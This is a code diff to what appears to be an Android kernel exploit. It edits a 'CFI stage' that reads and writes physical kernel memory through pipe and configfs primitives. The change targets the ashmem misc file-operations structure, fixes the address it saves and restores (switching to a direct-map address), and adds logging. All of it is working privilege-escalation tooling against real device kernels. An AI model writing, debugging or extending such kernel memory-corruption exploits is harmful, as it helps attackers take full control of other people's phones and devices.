@@ -526,11 +526,13 @@ int try_cfi_stage(void) {
     return 0;
   }
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops_direct = data_direct_addr(ASHMEM_MISC_FOPS);
   uint64_t saved_misc_list[2] = {0, 0};
-  pipe_phys_read_data(fd, misc_fops + 8, &saved_misc_list, sizeof(saved_misc_list));
-  pr_info("cfi saved misc_list next=%016llx prev=%016llx\n",
+  pipe_phys_read_data(fd, misc_fops_direct + 8, &saved_misc_list, sizeof(saved_misc_list));
+  pr_info("cfi saved misc_list next=%016llx prev=%016llx direct=%016zx\n",
           (unsigned long long)saved_misc_list[0],
-          (unsigned long long)saved_misc_list[1]);
+          (unsigned long long)saved_misc_list[1],
+          misc_fops_direct + 8);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -627,11 +629,13 @@ int try_cfi_stage(void) {
   }
 
   if (saved_misc_list[0] != 0 || saved_misc_list[1] != 0) {
-    int lr = pipe_phys_write_data(fd, misc_fops + 8,
+    int lr = pipe_phys_write_data(fd, misc_fops_direct + 8,
                                   &saved_misc_list, sizeof(saved_misc_list));
     pr_info("cfi restored misc_list write=%d next=%016llx prev=%016llx\n",
             lr, (unsigned long long)saved_misc_list[0],
             (unsigned long long)saved_misc_list[1]);
+  } else {
+    pr_warning("cfi misc_list was zero — read may have used wrong address space\n");
   }
 
   uint64_t before = 0;
